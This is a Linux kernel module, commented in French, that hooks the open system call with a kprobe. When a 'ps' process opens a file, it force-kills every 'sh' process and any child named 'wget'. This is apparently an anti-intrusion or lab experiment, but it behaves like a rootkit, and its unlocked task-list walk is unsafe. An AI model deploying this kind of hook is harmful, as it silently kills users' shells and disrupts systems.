#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/signal.h>
#include <linux/pid.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");

/* Variables globales */
static struct workqueue_struct *wq;
static void kill_all_communications(void);

/* Structure pour les données de travail */
struct work_data {
    struct work_struct work;
};

/* Fonction pour tuer les processus spécifiques */
static void kill_all_communications_task(void) {
    struct task_struct *task;
    struct pid *pid_struct;

    /* Parcourt tous les processus */
    for_each_process(task) {
        struct task_struct *child;

        /* Parcourt les threads enfants */
        list_for_each_entry(child, &task->children, sibling) {
            if (strstr(child->comm, "wget")) {
                pr_info("[+] Found child with wget: PID=%d, name=%s\n", child->pid, child->comm);

                pid_struct = find_get_pid(child->pid);
                if (pid_struct) {
                    kill_pid(pid_struct, SIGKILL, 1); // Envoie SIGKILL au processus
                    put_pid(pid_struct);
                }
            }
        }

        /* Détecte aussi les processus principaux nommés "sh" */
        if (strcmp(task->comm, "sh") == 0) {
            pr_info("[+] Found parent shell: PID=%d, name=%s\n", task->pid, task->comm);

            pid_struct = find_get_pid(task->pid);
            if (pid_struct) {
                kill_pid(pid_struct, SIGKILL, 1); // Envoie SIGKILL au processus principal
                put_pid(pid_struct);
            }
        }
    }
}

/* Handler pour la workqueue */
static void work_handler(struct work_struct *work) {
    pr_info("[+] Executing kill_all_communications task\n");
    kill_all_communications_task();
    kfree(work); // Libérer la mémoire après exécution
}

/* Fonction pour planifier le travail */
void kill_all_communications(void) {
    struct work_data *wd;

    /* Alloue de la mémoire pour le travail */
    wd = kmalloc(sizeof(struct work_data), GFP_ATOMIC);
    if (!wd) {
        pr_err("[-] Failed to allocate memory for work\n");
        return;
    }

    INIT_WORK(&wd->work, work_handler);
    queue_work(wq, &wd->work); // Planifie la tâche dans la workqueue
}

/* Handler pour le kprobe */
static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    static int last_pid = 0;

    if (current->pid == last_pid) {
        return 0;
    }

    pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s\n", current->pid, current->comm);

    if (strcmp(current->comm, "ps") == 0) {
        kill_all_communications(); // Planifie la suppression des processus
    }

    last_pid = current->pid;
    return 0;
}

/* Variables pour le kprobe */
static struct kprobe kp;

/* Initialisation du module */
static int __init hook_init(void) {
    int ret;

    /* Créer une workqueue */
    wq = create_singlethread_workqueue("kill_comm_wq");
    if (!wq) {
        pr_err("[-] Failed to create workqueue\n");
        return -ENOMEM;
    }

    /* Configurer le kprobe */
    kp.symbol_name = "__x64_sys_open";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[-] Failed to register kprobe: %d\n", ret);
        destroy_workqueue(wq);
        return ret;
    }

    pr_info("[+] __x64_sys_open hooked successfully\n");
    return 0;
}

/* Nettoyage du module */
static void __exit hook_exit(void) {
    unregister_kprobe(&kp);
    destroy_workqueue(wq);
    pr_info("[+] __x64_sys_open unhooked successfully\n");
}

module_init(hook_init);
module_exit(hook_exit);

